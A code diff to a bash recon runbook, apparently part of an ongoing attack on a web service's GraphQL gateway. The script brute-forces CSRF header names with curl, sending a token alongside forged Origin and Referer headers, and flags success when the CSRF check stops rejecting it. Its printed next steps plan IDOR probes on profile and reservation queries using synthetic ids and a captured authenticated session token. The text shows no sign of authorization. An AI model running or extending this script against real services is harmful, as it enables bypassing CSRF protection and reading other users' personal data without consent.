@@ -19,7 +19,7 @@
 # Run (Termux): OUTDIR=$HOME/s39 bash runbooks/PI-RUNBOOK-session39-hnv-csrf2.sh \
 #                 2>&1 | tee $HOME/s39/s39.log
 # =============================================================================
-set -eo pipefail
+set -o pipefail   # NOT -e: grep-finds-nothing must not kill the recon script
 if [ -z "${OUTDIR:-}" ]; then
   if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s39
   elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s39"
@@ -106,9 +106,13 @@ for N in $NAMES; do
        -H "Origin: $B" -H "Referer: $B/" -H "$N: $TOK" \
        --max-time 20 --data "$Q" \
        -w '%{http_code}|%{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000|0")
-  msg=$(head -c 60 "$OUTDIR/g.txt" | tr '\n' ' ')
+  msg=$(head -c 80 "$OUTDIR/g.txt" | tr '\n' ' ')
   printf '  hdr[%-26s] -> %s | %sB :: %s\n' "$N" "${m%|*}" "${m#*|}" "$msg"
-  if grep -q '"data"' "$OUTDIR/g.txt" 2>/dev/null; then WIN="$N"; cp "$OUTDIR/g.txt" "$OUTDIR/introspection-success.json"; break; fi
+  # WIN = we got PAST the CSRF gate (response no longer "CSRF token not found")
+  if [ -s "$OUTDIR/g.txt" ] && ! grep -q 'CSRF token not found' "$OUTDIR/g.txt" 2>/dev/null; then
+    WIN="$N"; cp "$OUTDIR/g.txt" "$OUTDIR/csrf-passed.json"
+    echo "    ^^^ PAST CSRF GATE with header [$N]"; break
+  fi
   sleep 0.3
 done
 # also try token as a cookie + in body
@@ -130,10 +134,14 @@ echo ""
 
 echo "════════════════════════════════════════════"
 if [ -n "$WIN" ]; then
-  echo "  *** CSRF SOLVED via [$WIN] — GraphQL returned data."
-  echo "  Introspection (first 1200B):"; head -c 1200 "$OUTDIR/introspection-success.json"; echo
-  echo "  >>> Next: map id-bearing queries; test reservationDetails/getProfileDetails"
-  echo "  >>> with synthetic id for unauth/IDOR."
+  echo "  *** PAST CSRF via [$WIN]. Response (first 1400B):"
+  head -c 1400 "$OUTDIR/csrf-passed.json"; echo
+  echo ""
+  echo "  >>> If schema/data returned -> map id-bearing queries; test public ops"
+  echo "  >>> (properties/propertyDetails) then user ops (reservationDetails,"
+  echo "  >>> getProfileDetails) with synthetic id. If user ops now say"
+  echo "  >>> 'unauthorized/session' -> they are session-gated (hvmi_signInToken);"
+  echo "  >>> capture an authenticated HnV session next for the IDOR test."
 else
   echo "  CSRF still unmatched. The token likely binds to an authenticated session"
   echo "  or a header name only present in the minified JS context above. Inspect"
